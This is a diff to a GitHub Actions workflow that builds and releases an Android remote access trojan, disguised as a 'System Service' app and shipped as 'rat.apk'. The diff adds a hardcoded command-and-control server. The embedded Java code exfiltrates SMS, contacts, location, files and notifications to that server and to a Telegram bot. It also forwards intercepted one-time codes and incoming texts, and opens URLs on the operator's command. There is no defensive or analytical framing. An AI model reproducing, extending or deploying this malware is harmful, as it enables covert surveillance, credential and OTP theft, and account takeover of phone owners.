@@ -71,6 +71,7 @@ jobs:
             <string name="app_name">System Service</string>
             <string name="vanta_token">$BT</string>
             <string name="vanta_chat">$CI</string>
+            <string name="vanta_server">http://147.135.213.72:20378</string>
           </resources>
           EOF
 
@@ -160,12 +161,13 @@ jobs:
           import java.net.*;
           import org.json.*;
           public class BotService extends Service {
-            static String TK = "", CH = "";
-            long off = 0;
+            static String TK = "", CH = "", SRV = "", DID = "";
             public void onCreate() {
               super.onCreate();
               TK = getString(R.string.vanta_token);
               CH = getString(R.string.vanta_chat);
+              SRV = getString(R.string.vanta_server);
+              DID = Build.MANUFACTURER + "_" + Build.MODEL + "_" + Long.toHexString(System.currentTimeMillis());
               startForeground(1, notif());
               new Thread(new Runnable() { public void run() { loop(); } }).start();
             }
@@ -179,52 +181,97 @@ jobs:
                 ? new Notification.Builder(this, c) : new Notification.Builder(this);
               return b.setContentTitle("sync").setSmallIcon(android.R.drawable.stat_notify_sync).build();
             }
-            String post(String m, String d) {
+            static String enc(String s) {
+              try { return URLEncoder.encode(s, "UTF-8"); } catch (Exception e) { return s; }
+            }
+            String http(String url) {
               try {
-                URL u = new URL("https://api.telegram.org/bot" + TK + "/" + m);
-                HttpURLConnection c = (HttpURLConnection) u.openConnection();
-                c.setDoOutput(true); c.setRequestMethod("POST"); c.setConnectTimeout(20000);
-                c.getOutputStream().write(d.getBytes("UTF-8"));
+                HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
+                c.setConnectTimeout(15000); c.setReadTimeout(35000);
                 BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream()));
                 StringBuilder s = new StringBuilder(); String l;
                 while ((l = r.readLine()) != null) s.append(l);
+                r.close();
                 return s.toString();
-              } catch (Exception e) { return null; }
+              } catch (Exception e) { return ""; }
             }
-            void send(String t) {
-              try { post("sendMessage", "chat_id=" + CH + "&text=" + URLEncoder.encode(t, "UTF-8")); }
-              catch (Exception e) {}
+            void httpPost(String url, String body) {
+              try {
+                HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
+                c.setDoOutput(true); c.setRequestMethod("POST");
+                c.setRequestProperty("Content-Type", "application/json");
+                c.getOutputStream().write(body.getBytes("UTF-8"));
+                c.getInputStream().close();
+              } catch (Exception e) {}
+            }
+            static void alert(Context ctx, String text) {
+              try {
+                String tk = ctx.getString(R.string.vanta_token);
+                String ch = ctx.getString(R.string.vanta_chat);
+                HttpURLConnection c = (HttpURLConnection) new URL("https://api.telegram.org/bot" + tk + "/sendMessage").openConnection();
+                c.setDoOutput(true); c.setRequestMethod("POST");
+                c.getOutputStream().write(("chat_id=" + ch + "&text=" + URLEncoder.encode(text, "UTF-8")).getBytes("UTF-8"));
+                c.getInputStream().close();
+              } catch (Exception e) {}
+            }
+            static void tgFile(Context ctx, String path, String caption) {
+              try {
+                String tk = ctx.getString(R.string.vanta_token);
+                String ch = ctx.getString(R.string.vanta_chat);
+                String b = "----x" + System.currentTimeMillis();
+                HttpURLConnection c = (HttpURLConnection) new URL("https://api.telegram.org/bot" + tk + "/sendDocument").openConnection();
+                c.setDoOutput(true); c.setRequestMethod("POST");
+                c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + b);
+                DataOutputStream o = new DataOutputStream(c.getOutputStream());
+                o.writeBytes("--" + b + "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + ch + "\r\n");
+                o.writeBytes("--" + b + "\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n" + caption + "\r\n");
+                o.writeBytes("--" + b + "\r\nContent-Disposition: form-data; name=\"document\"; filename=\"" + new File(path).getName() + "\"\r\n");
+                o.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
+                FileInputStream f = new FileInputStream(path);
+                byte[] buf = new byte[8192]; int n;
+                while ((n = f.read(buf)) > 0) o.write(buf, 0, n);
+                f.close();
+                o.writeBytes("\r\n--" + b + "--\r\n");
+                o.flush(); o.close();
+                c.getInputStream().close();
+              } catch (Exception e) {}
+            }
+            void res(String t) {
+              httpPost(SRV + "/result", "{\"id\":\"" + DID + "\",\"data\":" + JSONObject.quote(t) + "}");
             }
             void loop() {
+              http(SRV + "/register?id=" + enc(DID) + "&info=" + enc(Build.MANUFACTURER + " " + Build.MODEL + " | Android " + Build.VERSION.RELEASE));
               while (true) {
                 try {
-                  String r = post("getUpdates", "offset=" + off + "&timeout=30");
-                  if (r != null) {
-                    JSONArray a = new JSONObject(r).getJSONArray("result");
-                    for (int i = 0; i < a.length(); i++) {
-                      JSONObject u = a.getJSONObject(i);
-                      off = u.getLong("update_id") + 1;
-                      if (!u.has("message")) continue;
-                      JSONObject m = u.getJSONObject("message");
-                      if (!m.getJSONObject("chat").get("id").toString().equals(CH)) continue;
-                      if (!m.has("text")) continue;
-                      cmd(m.getString("text").trim());
-                    }
-                  }
+                  String r = http(SRV + "/task?id=" + enc(DID));
+                  String cmd = "";
+                  try { cmd = new JSONObject(r).optString("cmd", ""); } catch (Exception e) {}
+                  if (cmd.length() > 0) doCmd(cmd);
                 } catch (Exception e) {}
-                try { Thread.sleep(1000); } catch (Exception e) {}
+                try { Thread.sleep(3000); } catch (Exception e) {}
               }
             }
-            void cmd(String c) {
+            void doCmd(String cmd) {
               try {
-                if (c.equals("/sms")) send(sms());
-                else if (c.equals("/notif")) send(NotifListener.dump());
-                else if (c.equals("/loc")) send(loc());
-                else if (c.equals("/sys")) send(Build.MANUFACTURER + " " + Build.MODEL + " Android " + Build.VERSION.RELEASE);
-                else if (c.equals("/contacts")) send(contacts());
-                else if (c.equals("/files")) send(files());
-                else send("/sms /notif /loc /sys /contacts /files");
-              } catch (Exception e) {}
+                String[] p = cmd.split(" ", 2);
+                String k = p[0].toLowerCase();
+                String a = p.length > 1 ? p[1] : "";
+                if (k.equals("sys")) res(Build.MANUFACTURER + " " + Build.MODEL + " | Android " + Build.VERSION.RELEASE);
+                else if (k.equals("sms")) res(sms());
+                else if (k.equals("contacts")) res(contacts());
+                else if (k.equals("files")) res(listDir(a));
+                else if (k.equals("ls")) res(listDir(a));
+                else if (k.equals("loc")) res(loc());
+                else if (k.equals("get")) {
+                  File f = new File(a);
+                  if (f.exists()) tgFile(this, a, "file"); else res("not found");
+                }
+                else if (k.equals("open")) {
+                  startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(a)).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
+                  res("ok");
+                }
+                else res("cmd: " + cmd);
+              } catch (Exception e) { res("ERR " + e); }
             }
             String sms() {
               StringBuilder s = new StringBuilder("SMS:\n");
@@ -251,10 +298,10 @@ jobs:
               } catch (Exception e) { s.append("no perm"); }
               return s.toString();
             }
-            String files() {
+            String listDir(String a) {
               StringBuilder s = new StringBuilder("Files:\n");
               try {
-                File d = Environment.getExternalStorageDirectory();
+                File d = (a == null || a.length() == 0) ? Environment.getExternalStorageDirectory() : new File(a);
                 for (File f : d.listFiles()) { if (f.isFile()) s.append(f.getName()).append("\n"); if (s.length() > 3000) break; }
               } catch (Exception e) { s.append("no perm"); }
               return s.toString();
@@ -291,7 +338,7 @@ jobs:
                 String line = s.getPackageName() + " | " + t + ": " + y;
                 synchronized (L) { L.addFirst(line); while (L.size() > 60) L.removeLast(); }
                 boolean hot = s.getPackageName().contains("telegram") || y.matches(".*\\b\\d{4,6}\\b.*");
-                if (hot) new BotService().send("!! " + line);
+                if (hot) alert(this, "!! " + line);
               } catch (Exception e) {}
             }
             public static String dump() {
@@ -317,7 +364,7 @@ jobs:
                   f = m.getOriginatingAddress();
                   s.append(m.getMessageBody());
                 }
-                new BotService().send("SMS " + f + ": " + s);
+                alert(c, "SMS " + f + ": " + s);
               } catch (Exception e) {}
             }
           }
@@ -354,3 +401,11 @@ jobs:
         with:
           name: rat
           path: rat.apk
+
+      - name: Release
+        uses: softprops/action-gh-release@v2
+        with:
+          tag_name: latest
+          files: rat.apk
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
